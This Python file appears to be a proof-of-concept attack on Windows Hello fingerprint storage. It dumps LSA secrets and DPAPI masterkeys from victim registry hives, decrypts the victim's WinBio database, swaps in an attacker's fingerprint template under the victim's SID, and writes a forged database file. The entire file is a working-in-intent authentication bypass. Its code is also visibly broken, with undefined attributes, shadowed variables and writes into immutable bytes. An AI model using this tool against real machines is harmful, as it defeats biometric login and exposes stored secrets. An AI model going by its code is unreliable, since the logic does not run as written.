from dpapi import DPAPI
from lsa import LSA

import os.path as path
from Crypto.Hash import SHA1, SHA256, SHA512, HMAC



class BIO():
    def __init__(self):
        pass



    def set_hive(self, system_path: str, security_path: str, software_path: str) -> LSA:
        lsa = LSA()
        if not lsa.set_system(system_path):
            return False
        if not self.victim_lsa.set_security(security_path):
            return False
        if not self.victim_lsa.set_software(software_path):
            return False

        return lsa
    

    def set_dpapi(self, masterkey_path: str, winbiodata_path: str) -> tuple[DPAPI, bytes, bytes, bytes]:
        dpapi = DPAPI()
        if not dpapi.set_masterkey_file(masterkey_path):
            return False
        
        if path.exists(winbiodata_path) and path.isfile(winbiodata_path):
            with open(winbiodata_path, "rb") as f:
                winbiodata = f.read()
        else:
            raise FileNotFoundError(f"[!] File not found: {winbiodata}")
        dpapi = winbiodata[4: 4+0x156]
        root_finger = winbiodata.find(b"\x46\xED\xCA\xD1")
        finger = winbiodata.find(b"\x46\xED\xCA\xD1", root_finger + 4)
        
        return dpapi, winbiodata, dpapi, root_finger, finger
    

    def lsadump_secret(self, lsa: LSA) -> bool:
        if lsa is None:
            raise RuntimeError("[!] Victim LSA not set.")
        
        if not lsa.get_syskey():
            return False
        if not lsa.get_secrets():
            return False
        if not lsa.get_sid():
            return False
        
        return True
    

    def dpapi_masterkey(self, dpapi: DPAPI) -> bool:
        if dpapi is None:
            raise RuntimeError("[!] Victim DPAPI not set.")
        
        if not dpapi.set_secrets(self.victim_lsa.secrets):
            return False
        if not dpapi.set_sid(self.victim_lsa.sid):
            return False
        if not dpapi.set_sid_str(self.victim_lsa.sid_str):
            return False
        
        if not dpapi.get_masterkey():
            return False
        return True
    

    def dpapi_decrypt(self, dpapi: DPAPI, blob: bytes) -> bytes:
        if dpapi is None:
            raise RuntimeError("[!] Victim DPAPI not set.")
        if blob is None:
            raise RuntimeError("[!] No blob to decrypt.")
        
        result = dpapi.decrypt(blob)

        return result
    

    def dpapi_encrypt(self, dpapi: DPAPI, payload: bytes) -> bytes:
        if dpapi is None:
            raise RuntimeError("[!] Victim DPAPI not set.")
        if payload is None:
            raise RuntimeError("[!] No payload to encrypt.")
        
        result = dpapi.encrypt(payload)
        
        return result


def main( 
            victim_system_path: str, 
            victim_security_path: str, 
            victim_software_path: str, 
            victim_masterkey_path: str,
            victim_winbiodata_path: str,
            attacker_system_path: str,
            attacker_security_path: str,
            attacker_software_path: str,
            attacker_masterkey_path: str,
            attacker_winbiodata_path: str,
            new_key_path: str
        ) -> None:
    
    bio = BIO()
    victim_lsa = bio.set_hive(victim_system_path, victim_security_path, victim_software_path)
    victim_dpapi, victim_winbio, victim_dpapi_blob, victim_root_finger, victim_finger = bio.set_dpapi(victim_masterkey_path, victim_winbiodata_path)
    if bio.lsadump_secret(victim_lsa):
        print(f"[+] Victim SYSKEY: {victim_lsa.syskey.hex()}")
        print(f"[+] Victim SID: {victim_lsa.sid.hex()}")
        print(f"[+] Victim SID str: {victim_lsa.sid_str}")
        print(f"[+] Victim DPAPI secrets: {victim_lsa.secrets.hex()}")

    if bio.dpapi_masterkey(victim_dpapi):
        print(f"[+] Victim masterkey: {victim_dpapi.masterkey.hex()}")
    
    victim_dpapi_decrypt = bio.dpapi_decrypt(victim_dpapi, victim_dpapi_blob)

    attacker_lsa = bio.set_hive(attacker_system_path, attacker_security_path, attacker_software_path)
    attacker_dpapi, attacker_winbio, attacker_dpapi_blob, attacker_root_finger, attacker_finger = bio.set_dpapi(attacker_masterkey_path, attacker_winbiodata_path)
    if bio.lsadump_secret(attacker_lsa):
        print(f"[+] Attacker SYSKEY: {attacker_lsa.syskey.hex()}")
        print(f"[+] Attacker SID: {attacker_lsa.sid.hex()}")
        print(f"[+] Attacker SID str: {attacker_lsa.sid_str}")
        print(f"[+] Attacker DPAPI secrets: {attacker_lsa.secrets.hex()}")
    
    if bio.dpapi_masterkey(attacker_dpapi):
        print(f"[+] Attacker masterkey: {attacker_dpapi.masterkey.hex()}")

    attacker_dpapi_decrypt = bio.dpapi_decrypt(attacker_dpapi, attacker_dpapi_blob)


    new_root_finger = attacker_winbio[attacker_root_finger:attacker_finger]
    new_finger = attacker_winbio[attacker_finger:]
    new_finger[0x5c:0x5c+0xE] = victim_lsa.sid

    new_finger = new_finger + new_finger
    new_checksum = SHA256.new(new_finger).digest()

    attacker_dpapi_decrypt[0x48:0x69] = new_checksum

    new_dpapi_encrypt = bio.dpapi_encrypt(victim_dpapi, attacker_dpapi_decrypt)
    victim_dpapi_blob[0x92:0x113] = new_dpapi_encrypt

    key = SHA1.new(victim_dpapi.masterkey).digest()
    signature = HMAC.new(key, victim_dpapi[0x14:0x113])
    victim_dpapi_blob[0x116:] = signature

    new_winbiodata = victim_dpapi_blob + new_finger

    with open(new_key_path, "wb") as f:
        f.write(new_winbiodata)
    print(f"[+] New winbiodata written to: {new_key_path}")


if __name__ == "__main__":
    victim_system_path = "../example-data/victim/SYSTEM"
    victim_security_path = "../example-data/victim/SECURITY"
    victim_software_path = "../example-data/victim/SOFTWARE"
    victim_masterkey_path = "../example-data/victim/1072e1d2-ef2d-4803-afac-21e98d0eb71a"
    victim_winbiodata_path = "../example-data/victim/WinBioDatabase_v1.dat"

    attacker_system_path = "../example-data/attacker/SYSTEM"
    attacker_security_path = "../example-data/attacker/SECURITY"
    attacker_software_path = "../example-data/attacker/SOFTWARE"
    attacker_masterkey_path = "../example-data/attacker/1072e1d2-ef2d-4803-afac-21e98d0eb71a"
    attacker_winbiodata_path = "../example-data/attacker/WinBioDatabase_v1.dat"

    new_key_path = "./new_winbiodata.dat"

    main(
        victim_system_path, 
        victim_security_path, 
        victim_software_path, 
        victim_masterkey_path,
        victim_winbiodata_path,
        attacker_system_path,
        attacker_security_path,
        attacker_software_path,
        attacker_masterkey_path,
        attacker_winbiodata_path,
        new_key_path
    )